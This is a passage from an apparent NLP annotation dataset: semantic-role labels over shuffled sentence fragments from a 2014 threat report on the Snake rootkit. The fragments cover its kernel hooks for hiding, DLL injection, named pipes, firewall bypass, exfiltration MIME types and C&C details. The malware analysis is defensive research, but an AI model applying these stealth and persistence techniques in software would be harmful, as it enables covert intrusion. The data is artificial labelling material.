memory"}, "ARG0": {"text": "the Snake dropper"}, "V": {"text": "locates", "index": 25}, "ARG1": {"text": "the import of CI.dll \u2019s function CiInitialize ( )"}}}, "\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n<list>\n    \u2022\t ZwQuerySystemInformation\n    \u2022\t ZwQueryInformationProcess\n    \u2022\t ZwClose\n    \u2022\t ZwTerminateProcess\n</list>\nThe driver then watches for all userland processes to see if they load any web pages": {"sets": {"ARG1": {"text": "Another set of hooks"}, "ARG0": {"text": "it"}, "V": {"text": "sets", "index": 5}}, "is": {"V": {"text": "is", "index": 6}}, "designed": {"ARG1": {"text": "Another set of hooks/ it sets"}, "V": {"text": "designed", "index": 7}, "ARG3": {"text": "to hide the presence of the Snake components on the system"}}, "hide": {"ARG0": {"text": "it sets"}, "V": {"text": "hide", "index": 9}, "ARG1": {"text": "the presence of the Snake components on the system"}}, "watches": {"ARG0": {"text": "The driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "watches", "index": 23}, "ARG1": {"text": "for all userland processes"}, "ARGM-PRP": {"text": "to see if they load any web pages"}}, "see": {"V": {"text": "see", "index": 29}, "ARG1": {"text": "if they load any web pages"}}, "load": {"ARG0": {"text": "they"}, "V": {"text": "load", "index": 32}, "ARG2": {"text": "any web pages"}}}, " a browser)\n\n\n                                                                                                            2\n                                                                                    Embedded\n                       Snake\u2019s Kernel Mode                                          DLL Module\n                        Driver, with the DLL\n                       module embedded in it\n</figure>\n\nThe diagram illustrates the operation steps 1-4:\n\n    1     First, the malicious driver with the embedded DLL module injects that DLL into a system process,\n          such as services.exe; once loaded, the DLL will function in the \u2018pipe server\u2019 mode": {"embedded": {"ARG1": {"text": "the DLL module"}, "V": {"text": "embedded", "index": 17}, "ARG2": {"text": "in it"}}, "illustrates": {"ARG0": {"text": "The diagram"}, "V": {"text": "illustrates", "index": 22}, "ARG1": {"text": "the operation steps 1 - 4 : 1 First , the malicious driver with the embedded DLL module injects that DLL into a system process , such as services.exe ; once loaded , the DLL will function in the \u2018 pipe server \u2019 mode"}}, "steps": {"ARG0": {"text": "the operation"}, "V": {"text": "steps", "index": 25}, "ARG1": {"text": "1 - 4 : 1 First , the malicious driver with the embedded DLL module injects that DLL into a system process , such as services.exe"}}, "embedded_2": {"V": {"text": "embedded", "index": 38}, "ARG1": {"text": "DLL module"}}, "injects": {"ARG0": {"text": "the malicious driver with the embedded DLL module"}, "V": {"text": "injects", "index": 41}, "ARG1": {"text": "that DLL"}, "ARG2": {"text": "into a system process , such as services.exe"}}, "DLL": {"ARG0": {"text": "the embedded DLL module injects"}, "R-ARG0": {"text": "that"}, "V": {"text": "DLL", "index": 43}, "ARG1": {"text": "into a system process , such as services.exe"}}, "loaded": {"ARGM-TMP": {"text": "once"}, "V": {"text": "loaded", "index": 54}}, "will": {"ARGM-TMP": {"text": "once loaded"}, "ARG0": {"text": "the"}, "V": {"text": "will", "index": 58}, "ARG1": {"text": "function"}, "ARGM-LOC": {"text": "in the \u2018 pipe server \u2019"}}, "function": {"ARGM-TMP": {"text": "once loaded"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "function", "index": 59}, "ARGM-LOC": {"text": "in the \u2018 pipe server \u2019 mode"}}}, "\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value": {"may": {"V": {"text": "may", "index": 15}}, "ask": {"ARGM-ADV": {"text": "Apart from GET / POST requests"}, "ARG0": {"text": "the pipe clients ( infected usermode processes )"}, "ARGM-MOD": {"text": "may"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "ask", "index": 17}, "ARG2": {"text": "the pipe server"}, "ARG1": {"text": "to perform other operations on their behalf , such as saving data into a temporary file , copy / delete files , save configuration data into the registry under the aforementioned ShellCore value"}}, "perform": {"ARG0": {"text": "the pipe server"}, "V": {"text": "perform", "index": 22}, "ARG1": {"text": "other operations"}, "ARGM-GOL": {"text": "on their behalf"}}, "saving": {"V": {"text": "saving", "index": 31}, "ARG1": {"text": "data"}, "ARG2": {"text": "into a temporary file , copy / delete files"}}, "save": {"V": {"text": "save", "index": 43}, "ARG1": {"text": "configuration data"}, "ARG2": {"text": "into the registry"}, "ARGM-LOC": {"text": "under the aforementioned ShellCore value"}}}, "\n\nThe hook handler for ZwTerminateProcess() checks if the process being shut down is svchost.exe": {"being": {"V": {"text": "being", "index": 11}}, "shut": {"ARG1": {"text": "the process"}, "V": {"text": "shut", "index": 12}}, "is": {"ARG1": {"text": "the process being shut down"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "svchost.exe"}}}, " The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its\nunsigned 64-bit driver on a 64-bit version of Windows XP \u2013 as driver signing is not enforced it does not have to resort to any tricks\nunder this OS version": {"contains": {"ARG0": {"text": "The Snake dropper"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "both 32-bit and 64-bit unsigned drivers"}}, "can": {"V": {"text": "can", "index": 13}}, "load": {"ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "load", "index": 15}, "ARG1": {"text": "its unsigned 64-bit driver"}, "ARG2": {"text": "on a 64-bit version of Windows XP \u2013"}, "ARGM-ADV": {"text": "as driver signing is not enforced it does not have to resort to any tricks under this OS version"}}, "is": {"V": {"text": "is", "index": 31}}, "enforced": {"ARG1": {"text": "driver signing"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "enforced", "index": 33}}, "does": {"V": {"text": "does", "index": 35}}, "have": {"V": {"text": "have", "index": 37}}, "resort": {"ARG0": {"text": "it"}, "V": {"text": "resort", "index": 39}, "ARG1": {"text": "to any tricks"}, "ARGM-LOC": {"text": "under this OS version"}}}, "\n\nFull list of the named pipes used for communications is provided below:\n<list>\n    \u2022\t \\Device\\NamedPipe\\isapi_http\n    \u2022\t \\Device\\NamedPipe\\isapi_log\n    \u2022\t \\Device\\NamedPipe\\isapi_dg\n    \u2022\t \\Device\\NamedPipe\\services_control\n</list>\nMessages submitted into the pipes are wrapped into the structures": {"named": {"V": {"text": "named", "index": 4}, "ARG1": {"text": "pipes"}}, "used": {"ARG1": {"text": "the named pipes"}, "V": {"text": "used", "index": 6}, "ARG2": {"text": "for communications"}}, "is": {"V": {"text": "is", "index": 9}}, "provided": {"ARG1": {"text": "Full list of the named pipes used for communications"}, "V": {"text": "provided", "index": 10}, "ARGM-LOC": {"text": "below"}}, "submitted": {"ARG1": {"text": "Messages"}, "V": {"text": "submitted", "index": 14}, "ARG2": {"text": "into the pipes"}}, "are": {"V": {"text": "are", "index": 18}}, "wrapped": {"ARG1": {"text": "Messages submitted into the pipes"}, "V": {"text": "wrapped", "index": 19}, "ARG2": {"text": "into the structures"}}}, "\n\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n<list>\n    \u2022\t ZwCreateThread\n    \u2022\t ZwCreateUserProcess\n    \u2022\t ZwShutdownSystem\n</list>\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started": {"sets": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "the driver"}, "V": {"text": "sets", "index": 4}, "ARG1": {"text": "the hooks for the following kernel - mode APIs"}}, "following": {"V": {"text": "following", "index": 10}, "ARG1": {"text": "kernel - mode APIs"}}, "calls": {"ARGM-TMP": {"text": "After that"}, "ARG0": {"text": "it"}, "V": {"text": "calls", "index": 20}, "ARG1": {"text": "PsSetCreateProcessNotifyRoutine ("}, "ARG2": {"text": ")"}, "ARGM-PRP": {"text": "in order to be notified whenever a new process is started"}}, "be": {"V": {"text": "be", "index": 27}}, "notified": {"V": {"text": "notified", "index": 28}, "ARGM-TMP": {"text": "whenever a new process is started"}}, "is": {"V": {"text": "is", "index": 33}}, "started": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "a new process"}, "V": {"text": "started", "index": 34}}}, "\n<figure>\n    Intercepting Network Data\n\n\n                                NdisMIndicateReceiveNetBufferLists()\n\n     NDIS Protocol                                        Miniport\n                                  NDIS\n        Driver                                             Driver\n\n       ProtocolReceiveNetBufferLists()\n</figure>\n<figure>\n\n    Sending Network Data\n\n                                    MiniportSendNetBufferLists()\n\n\n     NDIS Protocol                                       Miniport\n                                  NDIS\n        Driver                                            Driver\n\n           NdisSendNetBufferLists()\n</figure>\nWhenever the underlying miniport driver\nreceives data from the network, it calls NDIS\nby invoking a data receive indication function\nNdisMIndicateReceiveNetBufferLists()": {"underlying": {"V": {"text": "underlying", "index": 2}, "ARG0": {"text": "miniport driver"}}, "receives": {"ARGM-TMP": {"text": "Whenever"}, "ARG0": {"text": "the underlying miniport driver"}, "V": {"text": "receives", "index": 5}, "ARG1": {"text": "data"}, "ARG2": {"text": "from the network"}}, "calls": {"ARGM-TMP": {"text": "Whenever the underlying miniport driver receives data from the network"}, "ARG0": {"text": "it"}, "V": {"text": "calls", "index": 12}, "ARG1": {"text": "NDIS"}, "ARGM-MNR": {"text": "by invoking"}}, "invoking": {"V": {"text": "invoking", "index": 15}, "ARG1": {"text": "a data receive indication function NdisMIndicateReceiveNetBufferLists ( )"}}}, "\n\n</section>\n\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        7</footer>\n\n\f\n<section>\n<heading>ROOTKIT EXECUTION</heading>\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32": {"executed": {"ARGM-TMP": {"text": "When/ first"}, "V": {"text": "executed", "index": 2}, "ARG1": {"text": "the driver"}}, "creates": {"ARGM-TMP": {"text": "When first executed"}, "ARG0": {"text": "the driver"}, "V": {"text": "creates", "index": 6}, "ARG1": {"text": "device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32"}}, "named": {"ARG1": {"text": "device"}, "V": {"text": "named", "index": 8}, "ARG2": {"text": "\\Device\\vstor32"}}}, "\n\nThe ZwClose() hook handler is used to inject the DLL module into the userland processes": {"is": {"V": {"text": "is", "index": 6}}, "used": {"ARG1": {"text": "The ZwClose ( ) hook handler"}, "V": {"text": "used", "index": 7}, "ARG2": {"text": "to inject the DLL module into the userland processes"}}, "inject": {"ARG0": {"text": "The ZwClose ( ) hook handler"}, "V": {"text": "inject", "index": 9}, "ARG1": {"text": "the DLL module into the userland processes"}}}, "\n\nWith its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and\nmaking its open ports invisible to scanners": {"can": {"V": {"text": "can", "index": 8}}, "send": {"ARGM-MNR": {"text": "With its own miniport handler functions/ by using a private TCP / IP stack ,"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "send", "index": 9}, "ARG1": {"text": "data"}, "ARGM-PRD": {"text": "bypassing all firewall hooks , and making its open ports invisible to scanners"}}, "receive": {"ARGM-MNR": {"text": "With its own miniport handler functions/ by using a private TCP / IP stack , bypassing all firewall hooks , and making"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "receive", "index": 11}, "ARG1": {"text": "data"}, "ARGM-PRD": {"text": "its open ports invisible to scanners"}}, "using": {"V": {"text": "using", "index": 14}, "ARG1": {"text": "a private TCP / IP stack"}}, "bypassing": {"ARG0": {"text": "it"}, "V": {"text": "bypassing", "index": 22}, "ARG1": {"text": "all firewall hooks"}}, "making": {"ARG0": {"text": "it"}, "V": {"text": "making", "index": 28}, "ARG1": {"text": "its open ports invisible to scanners"}}}, "\n\nThe ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,\nmaking possible the existence of the hybrid (kernel-centric and usermode-centric) architectures": {"update": {"V": {"text": "update", "index": 3}, "ARG1": {"text": "the driver"}}, "rely": {"ARGM-TMP": {"text": "then"}, "V": {"text": "rely", "index": 8}, "ARG1": {"text": "on its communication capabilities"}}, "means": {"ARG0": {"text": "The ability to update the driver and then rely on its communication capabilities"}, "V": {"text": "means", "index": 13}, "ARG1": {"text": "that the components of Snake are flexible"}, "ARGM-ADV": {"text": "making possible the existence of the hybrid ( kernel - centric and usermode - centric ) architectures"}}, "are": {"ARG1": {"text": "the components of Snake"}, "V": {"text": "are", "index": 19}, "ARG2": {"text": "flexible"}}, "making": {"V": {"text": "making", "index": 22}, "ARG1": {"text": "possible the existence of the hybrid ( kernel - centric and usermode - centric ) architectures"}}, "architectures": {"ARG0": {"text": "usermode"}, "ARG1": {"text": "- centric"}, "ARGM-ADJ": {"text": ")"}, "V": {"text": "architectures", "index": 38}}}, "\n\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module\ninto the process that initiated connection (the browser)": {"goes": {"ARG0": {"text": "the user"}, "V": {"text": "goes", "index": 7}, "ARG4": {"text": "online"}}, "intercepts": {"ARGM-DIS": {"text": "However"}, "ARGM-TMP": {"text": "as soon as the user goes online"}, "ARG0": {"text": "the driver"}, "V": {"text": "intercepts", "index": 12}, "ARG1": {"text": "that event"}}, "injects": {"ARGM-DIS": {"text": "However"}, "ARGM-TMP": {"text": "as soon as the user goes online/ then/ immediately"}, "ARG0": {"text": "the driver"}, "V": {"text": "injects", "index": 18}, "ARG1": {"text": "the malicious DLL module into the process that initiated connection ( the browser )"}}, "initiated": {"ARG0": {"text": "the process"}, "R-ARG0": {"text": "that"}, "V": {"text": "initiated", "index": 27}, "ARG1": {"text": "connection ( the browser )"}}}, "\n\nWhen run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts\nand detects what Windows RPC services are enabled at the endpoints": {"run": {"ARGM-TMP": {"text": "When"}, "V": {"text": "run", "index": 1}, "ARG1": {"text": "as a command line tool"}, "ARGM-MNR": {"text": "with its logic defined with the command line switches"}}, "defined": {"ARG1": {"text": "its logic"}, "V": {"text": "defined", "index": 11}, "ARG2": {"text": "with the command line switches"}}, "switches": {"ARG1": {"text": "the command line"}, "V": {"text": "switches", "index": 16}}, "enumerates": {"ARGM-TMP": {"text": "When run as a command line tool , with its logic defined with the command line switches"}, "ARG0": {"text": "this tool"}, "V": {"text": "enumerates", "index": 20}, "ARG1": {"text": "other network hosts"}}, "detects": {"ARGM-TMP": {"text": "When run as a command line tool"}, "ARGM-MNR": {"text": "with its logic defined with the command line switches"}, "ARG0": {"text": "this tool enumerates"}, "V": {"text": "detects", "index": 25}, "ARG1": {"text": "what Windows RPC services are enabled at the endpoints"}}, "are": {"V": {"text": "are", "index": 30}}, "enabled": {"ARG1": {"text": "what"}, "ARG0": {"text": "Windows RPC services"}, "V": {"text": "enabled", "index": 31}, "ARGM-LOC": {"text": "at the endpoints"}}}, "\n\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with\nXOR 0xAA applied on top of it, so the driver decrypts it first": {"drops": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "drops", "index": 3}, "ARG1": {"text": "a DLL"}, "ARG4": {"text": "into the % windows% directory"}}, "is": {"V": {"text": "is", "index": 14}}, "carried": {"ARG1": {"text": "the DLL"}, "V": {"text": "carried", "index": 15}, "ARGM-LOC": {"text": "in the body of the driver"}, "ARGM-MNR": {"text": "as a binary chunk with XOR 0xAA applied on top of it"}}, "applied": {"ARG0": {"text": "a binary chunk with XOR 0xAA"}, "V": {"text": "applied", "index": 29}, "ARG1": {"text": "on top of it"}}, "decrypts": {"ARG0": {"text": "the driver"}, "V": {"text": "decrypts", "index": 38}, "ARG1": {"text": "it"}, "ARGM-TMP": {"text": "first"}}}, " The usermode DLLs are still\ninjected into the system processes to perform high-level tasks": {"are": {"V": {"text": "are", "index": 3}}, "injected": {"ARG1": {"text": "The usermode DLLs"}, "ARGM-TMP": {"text": "still"}, "V": {"text": "injected", "index": 5}, "ARG2": {"text": "into the system processes"}, "ARGM-PRP": {"text": "to perform high - level tasks"}}, "processes": {"ARG1": {"text": "system"}, "V": {"text": "processes", "index": 9}}, "perform": {"ARG0": {"text": "The usermode DLLs"}, "V": {"text": "perform", "index": 11}, "ARG1": {"text": "high - level tasks"}}}, "\n\n\n</section>\n<section>\n<heading>\nNDIS PROTOCOL DRIVER</heading>\nThe Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver": {"registers": {"ARG0": {"text": "The Snake rootkit"}, "V": {"text": "registers", "index": 3}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as Network Driver Interface Specification ( NDIS ) protocol driver"}}}, "\n\nSnake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/\nIP stack, so that its callout driver is notified whenever a TCP connection is established by a browser": {"sets": {"ARG0": {"text": "Snake"}, "V": {"text": "sets", "index": 1}, "ARG1": {"text": "filters/ at the layers FWPM_LAYER_STREAM_V4"}}, "is": {"V": {"text": "is", "index": 20}}, "notified": {"ARG1": {"text": "its callout driver"}, "V": {"text": "notified", "index": 21}, "ARGM-TMP": {"text": "whenever a TCP connection is established by a browser"}}, "is_2": {"V": {"text": "is", "index": 26}}, "established": {"ARGM-TMP": {"text": "whenever"}, "ARG1": {"text": "a TCP connection"}, "V": {"text": "established", "index": 27}, "ARG0": {"text": "by a browser"}}}, " It then uses these identifiers to write a message to and read a message from the associated named pipes": {"uses": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "these identifiers"}, "ARG2": {"text": "to write a message to and read a message from the associated named pipes"}}, "write": {"ARG0": {"text": "It"}, "V": {"text": "write", "index": 6}, "ARG1": {"text": "a message to"}}, "read": {"ARG0": {"text": "It"}, "V": {"text": "read", "index": 11}, "ARG1": {"text": "a message"}, "ARG2": {"text": "from the associated named pipes"}}, "associated": {"V": {"text": "associated", "index": 16}, "ARG1": {"text": "named pipes"}}, "named": {"ARG1": {"text": "the associated"}, "V": {"text": "named", "index": 17}, "ARG2": {"text": "pipes"}}}, "\n\nBy using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim": {"using": {"V": {"text": "using", "index": 1}, "ARG1": {"text": "this function"}}, "can": {"V": {"text": "can", "index": 7}}, "identify": {"ARGM-MNR": {"text": "By using this function"}, "ARG0": {"text": "the remote attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "identify", "index": 8}, "ARG1": {"text": "any potentially exploitable hosts located in the same network as the victim"}}, "located": {"ARG1": {"text": "any potentially exploitable hosts"}, "V": {"text": "located", "index": 13}, "ARGM-LOC": {"text": "in the same network"}, "ARGM-PRD": {"text": "as the victim"}}}, "\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted": {"allow": {"ARG0": {"text": "The handlers of the hooks above along with the notification callback"}, "V": {"text": "allow", "index": 11}, "ARG1": {"text": "Snake to stay persistent on a system , being able to infect any newly created processes , and restore its driver file in case it gets deleted"}}, "stay": {"ARG1": {"text": "Snake"}, "V": {"text": "stay", "index": 14}, "ARG3": {"text": "persistent/ on a system"}, "ARGM-PRD": {"text": "being able to infect any newly created processes"}}, "being": {"ARG1": {"text": "Snake"}, "V": {"text": "being", "index": 20}, "ARG2": {"text": "able to infect any newly created processes"}}, "infect": {"ARG0": {"text": "Snake"}, "V": {"text": "infect", "index": 23}, "ARG1": {"text": "any newly created processes"}}, "created": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "created", "index": 26}, "ARG1": {"text": "processes"}}, "restore": {"ARG0": {"text": "Snake"}, "V": {"text": "restore", "index": 30}, "ARG1": {"text": "its driver file"}, "ARGM-PRP": {"text": "in case it gets deleted"}}, "gets": {"ARG1": {"text": "it"}, "V": {"text": "gets", "index": 37}, "ARG2": {"text": "deleted"}}, "deleted": {"ARG1": {"text": "it"}, "V": {"text": "deleted", "index": 38}}}, " The fingerprinting allows it to reveal the following characteristics for each host found in the network:\n<list>\n   \u2022\t   the version of the operating system\n   \u2022\t   version of the service pack\n   \u2022\t   the installed network services\n</list>\nThe data it retrieves is encrypted and saved into a configuration file %system%\\vtmon.bin": {"allows": {"ARG0": {"text": "The fingerprinting"}, "V": {"text": "allows", "index": 2}, "ARG1": {"text": "it to reveal the following characteristics for each host found in the network"}}, "reveal": {"ARG0": {"text": "it"}, "V": {"text": "reveal", "index": 5}, "ARG1": {"text": "the following characteristics for each host found in the network"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "characteristics"}}, "found": {"ARG1": {"text": "each host"}, "V": {"text": "found", "index": 12}, "ARGM-LOC": {"text": "in the network"}}, "retrieves": {"ARG1": {"text": "The data"}, "ARG0": {"text": "it"}, "V": {"text": "retrieves", "index": 20}}, "is": {"ARG1": {"text": "The data it retrieves"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "The data it retrieves"}, "V": {"text": "encrypted", "index": 22}}, "saved": {"ARG1": {"text": "The data it retrieves"}, "V": {"text": "saved", "index": 24}, "ARG2": {"text": "into a configuration file % system%\\vtmon.bin"}}}, "\n\nNext, it calculates and confirms a CRC32 checksum within the command, further decrypts the data by using the Number Theory\nLibrary (NTL), and makes sure the command is destined to the current host by matching the ID field in it": {"calculates": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "calculates", "index": 3}}, "confirms": {"ARGM-DIS": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "confirms", "index": 5}, "ARG1": {"text": "a CRC32 checksum within the command"}, "ARGM-ADV": {"text": "further decrypts the data by using the Number Theory Library ( NTL )"}}, "using": {"V": {"text": "using", "index": 18}, "ARG1": {"text": "the Number Theory Library ( NTL )"}}, "makes": {"ARGM-DIS": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "makes", "index": 28}, "ARG1": {"text": "sure the command is destined to the current host by matching the ID field in it"}}, "is": {"V": {"text": "is", "index": 32}}, "destined": {"ARG1": {"text": "the command"}, "V": {"text": "destined", "index": 33}, "ARG2": {"text": "to the current host"}, "ARGM-MNR": {"text": "by matching the ID field in it"}}, "matching": {"V": {"text": "matching", "index": 39}, "ARG1": {"text": "the ID field"}, "ARGM-LOC": {"text": "in it"}}}, " On a 64-bit OS, it will install a 64-bit driver": {"will": {"ARGM-LOC": {"text": "On a 64-bit OS"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "install a 64-bit driver"}}, "install": {"ARGM-LOC": {"text": "On a 64-bit OS"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 7}, "ARG1": {"text": "a 64-bit driver"}}}, "\n\nOn 64-bit versions of Windows Vista and above it behaves differently": {"behaves": {"V": {"text": "behaves", "index": 9}, "ARGM-MNR": {"text": "differently"}}}, "\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n<list>\n   \u2022\t     application/x-shockwave-flash\n   \u2022\t     image/pjpeg\n   \u2022\t     image/jpeg\n   \u2022\t     image/x-xbitmap\n   \u2022     image/gif\n   \u2022     application/msword\n   \u2022     application/vnd.ms-excel\n   \u2022     application/vnd.ms-powerpoint\n</list>\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp": {"may": {"V": {"text": "may", "index": 1}}, "rely": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "rely", "index": 2}, "ARG1": {"text": "on the following Internet Media types ( MIME types )"}, "ARG2": {"text": "for data exfiltration"}}, "uses": {"ARG1": {"text": "Request type"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 20}}, "can": {"V": {"text": "can", "index": 21}}, "be": {"ARG1": {"text": "Request type it uses"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 23}, "ARG2": {"text": "POST of GET"}}, "is": {"ARG1": {"text": "C&C server resource name"}, "V": {"text": "is", "index": 33}, "ARG2": {"text": "/default.asp"}}}, "\n\nThe files within that directory are used by the rootkit to store configuration and log data": {"are": {"V": {"text": "are", "index": 5}}, "used": {"ARG1": {"text": "The files within that directory"}, "V": {"text": "used", "index": 6}, "ARG0": {"text": "by the rootkit"}, "ARG2": {"text": "to store configuration and log data"}}, "store": {"ARG0": {"text": "The files within that directory"}, "V": {"text": "store", "index": 11}, "ARG1": {"text": "configuration"}}}, "\n\n</section>\n\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        24</footer>\n\n\f\n<section>\n<heading>RECONNAISSANCE TOOL</heading>\nOne of the Snake components that could have been downloaded from a remote C&C server, was identified as a network\nreconnaissance tool": {"could": {"V": {"text": "could", "index": 6}}, "have": {"V": {"text": "have", "index": 7}}, "been": {"V": {"text": "been", "index": 8}}, "downloaded": {"ARG1": {"text": "the Snake components"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "downloaded", "index": 9}, "ARG2": {"text": "from a remote C&C server"}}, "was": {"V": {"text": "was", "index": 16}}, "identified": {"ARG1": {"text": "One of the Snake components that could have been downloaded from a remote C&C server ,"}, "V": {"text": "identified", "index": 17}, "ARG2": {"text": "as a network reconnaissance tool"}}}, " If so, it will install a TDI filter driver": {"will": {"ARGM-ADV": {"text": "If so"}, "V": {"text": "will", "index": 4}, "ARG1": {"text": "install a TDI filter driver"}}, "install": {"ARGM-ADV": {"text": "If so"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 5}, "ARG1": {"text": "a TDI filter driver"}}}, " explorer.exe) are:\n<list>\n   \u2022\t     32-bit Windows OS:\n           \u2022\t rkctl_Win32.dll\n           \u2022\t inj_snake_Win32.dll\n\n   \u2022\t     64-bit Windows OS:\n           \u2022\t rkctl_x64.dll\n           \u2022\t inj_snake_x64.dll\n</list>\nThe rkctl_Win32.dll/rkctl_x64.dll module uses the following hard-coded named pipe for communications:\n<list>\n\\\\.\\pipe\\services_control\n</list>\nThe remote commands it receives appear to be designed to control other components of Snake:\n<list>\n   \u2022\t     tc_cancel\n   \u2022\t     config_read_uint32\n   \u2022\t     tr_free\n   \u2022\t     tr_alloc\n   \u2022\t     tc_send_request\n   \u2022\t     tr_write_pipe\n   \u2022\t     snake_modules_command\n   \u2022\t     t_setoptbin\n   \u2022      tc_free_data\n   \u2022      tc_get_reply\n   \u2022      tc_read_request_pipe\n   \u2022      tc_send_request_bufs\n   \u2022      t_close\n   \u2022      tc_socket\n   \u2022      snake_free\n   \u2022      snake_alloc\n</list>\nThe inj_snake_Win32.dll/inj_snake_x64.dll module exports 61 functions": {"are": {"ARG1": {"text": "explorer.exe )"}, "V": {"text": "are", "index": 2}, "ARG2": {"text": "The inj_snake_Win32.dll / inj_snake_x64.dll module exports 61 functions"}}}, "\n\nThis delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as\npossible": {"is": {"V": {"text": "is", "index": 4}}, "designed": {"ARG1": {"text": "This delegation of tasks"}, "V": {"text": "designed", "index": 5}, "ARG3": {"text": "to keep infected processes under the radar of the behavioural analysis tools for as long as possible"}}, "keep": {"ARG0": {"text": "This delegation of tasks"}, "V": {"text": "keep", "index": 7}, "ARG1": {"text": "infected processes"}, "ARGM-LOC": {"text": "under the radar of the behavioural analysis tools"}, "ARGM-TMP": {"text": "for as long as possible"}}}, "\n\nThe reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to\na remote C&C server": {"is": {"ARG1": {"text": "The reason behind such behaviour"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "that the driver is acting in this mode like a proxy , routing requests from other infected hosts to a remote C&C server"}}, "is_2": {"V": {"text": "is", "index": 9}}, "acting": {"ARG0": {"text": "the driver"}, "V": {"text": "acting", "index": 10}, "ARG1": {"text": "in this mode like a proxy , routing requests from other infected hosts to a remote C&C server"}}, "routing": {"V": {"text": "routing", "index": 18}, "ARG1": {"text": "requests from other infected hosts"}, "ARG2": {"text": "to a remote C&C server"}}}, "\n\n Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,\n\n where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command\n outputs, intercepted keystrokes, and other output logs": {"may": {"V": {"text": "may", "index": 3}}, "be": {"V": {"text": "be", "index": 5}}, "found": {"ARG1": {"text": "Other files"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "may"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "found", "index": 6}, "ARGM-LOC": {"text": "on the virtual volume"}}, "are": {"ARG1": {"text": "Other files that may also be found on the virtual volume"}, "V": {"text": "are", "index": 11}, "ARG2": {"text": "klog , conlog , dump , rkng_inst.exe , where rkng_inst.exe could be the name of the original dropper , and other log files could potentially contain executed command outputs , intercepted keystrokes , and other output logs"}}, "could": {"R-ARGM-LOC": {"text": "where"}, "V": {"text": "could", "index": 23}, "ARG1": {"text": "be the name of the original dropper"}}, "be_2": {"R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "rkng_inst.exe"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "be", "index": 24}, "ARG2": {"text": "the name of the original dropper"}}, "could_2": {"V": {"text": "could", "index": 36}}, "contain": {"ARG0": {"text": "other log files"}, "ARGM-MOD": {"text": "could"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "contain", "index": 38}, "ARG1": {"text": "executed command outputs , intercepted keystrokes , and other output logs"}}, "executed": {"ARG0": {"text": "other log files"}, "ARGM-MOD": {"text": "could"}, "ARGM-MNR": {"text": "potentially contain"}, "V": {"text": "executed", "index": 39}, "ARG1": {"text": "command outputs , intercepted keystrokes , and other output logs"}}, "intercepted": {"ARG0": {"text": "other log files"}, "ARGM-MOD": {"text": "could"}, 